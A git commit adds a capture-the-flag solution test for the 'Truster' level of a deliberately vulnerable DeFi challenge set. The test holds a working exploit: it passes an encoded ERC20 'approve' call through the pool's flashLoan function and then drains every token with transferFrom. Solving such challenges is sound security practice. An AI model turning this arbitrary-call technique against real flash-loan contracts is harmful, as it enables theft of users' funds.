a873d4f5d6db511a6d7aed5c0421ec8f5c1f659c
Sergi Juanati <wint3rmute@gmail.com>
2021-02-01 18:07:09 +0100

    #3 truster solved

---
+++ test/3-truster/truster.challenge.js
@@ -0,0 +1,57 @@
+const { ether } = require('@openzeppelin/test-helpers');
+const { accounts, contract } = require('@openzeppelin/test-environment');
+
+const DamnValuableToken = contract.fromArtifact('DamnValuableToken');
+const TrusterLenderPool = contract.fromArtifact('TrusterLenderPool');
+
+const { expect } = require('chai');
+
+describe('[Challenge] Truster', function () {
+
+    const [deployer, attacker, ...otherAccounts] = accounts;
+
+    const TOKENS_IN_POOL = ether('1000000');
+
+    before(async function () {
+        /** SETUP SCENARIO */
+        this.token = await DamnValuableToken.new({ from: deployer });
+        this.pool = await TrusterLenderPool.new(this.token.address, { from: deployer });
+
+        await this.token.transfer(this.pool.address, TOKENS_IN_POOL, { from: deployer });
+
+        expect(
+            await this.token.balanceOf(this.pool.address)
+        ).to.be.bignumber.equal(TOKENS_IN_POOL);
+
+        expect(
+            await this.token.balanceOf(attacker)
+        ).to.be.bignumber.equal('0');
+    });
+
+    it('Exploit', async function () {
+        const data = web3.eth.abi.encodeFunctionCall({
+            name: 'approve',
+            type: 'function',
+            inputs: [{
+                type: 'address',
+                name: 'spender'
+            },{
+                type: 'uint256',
+                name: 'amount'
+            }]
+        }, [attacker, TOKENS_IN_POOL.toString()]);
+    
+        this.pool.flashLoan(0, attacker, this.token.address, data)
+        await this.token.transferFrom(this.pool.address, attacker, TOKENS_IN_POOL, { from: attacker})
+    });
+
+    after(async function () {
+        /** SUCCESS CONDITIONS */
+        expect(
+            await this.token.balanceOf(attacker)
+        ).to.be.bignumber.equal(TOKENS_IN_POOL);        
+        expect(
+            await this.token.balanceOf(this.pool.address)
+        ).to.be.bignumber.equal('0');
+    });
+});
